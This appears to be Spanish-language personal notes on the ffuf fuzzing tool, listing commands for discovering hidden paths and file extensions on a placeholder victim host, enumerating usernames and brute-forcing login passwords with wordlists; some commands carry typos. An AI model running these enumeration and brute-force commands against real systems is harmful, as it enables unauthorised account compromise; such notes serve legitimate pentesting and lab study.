- Herramienta para hacer Fuzzing escrita en GO.
	- Se puede encontrar vulnerabilidades y rutas ocultas en la web.


- Para empezar a usarlo podemos usar este código:
```
ffuf -u http://(IP_VICTIMA)/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
```
- Si queremos ver las extensiones genéricas podemos usar este código:
```
ffuf -u http://(IP_VICTIMA)/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt
```
- Como no es muy eficiente buscar extensiones genéricas, vamos  a buscar extensiones de la pagina inicia. Por lo general la pagina inicial siempre se encuentra en `index`.
```
ffuf -u http://(IP_VICTIMA/(PAG_INICIAL)FUZZ -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt
```
- Si queremos ==especificar== extensiones usamos el comando `-e`.
```
ffuf -u http://(IP_VICTIMA)/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.txt
```
- Si queremos filtrar extensiones  y que no nos aparezcan, agregamos `-fc`.
- Si queremos que nos aparezca códigos en específicos, agregamos `-mc`
- Para encontrar usuarios usamos:
```
ffuf -w bypass.txt -X POST -u http:/(WEB_O_IP_VICTIMA) -d 'username=FUZZ&password=(CUALQUIER_COSA)' -H "(COPIAMOS_EL_CONTENT-TYPE_DE_BURPSUITE); charset=UTF-8" -fw 10
```
- Para hacer fuerza bruta usamos el siguiente comando:
```
ffuf -w /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt -X POST -u http/(WEB_O_IP_VICTIMA) -d 'username=(USERNAME)&password=FUZZ(EL_DATO_QUE_NO_TENGAMOS_VA_FUZZ)' -H "(COPIAMOS_EL_CONTENT-TYPE_DE_BURPSUITE); charset=UTF-8" -fw 8 
```
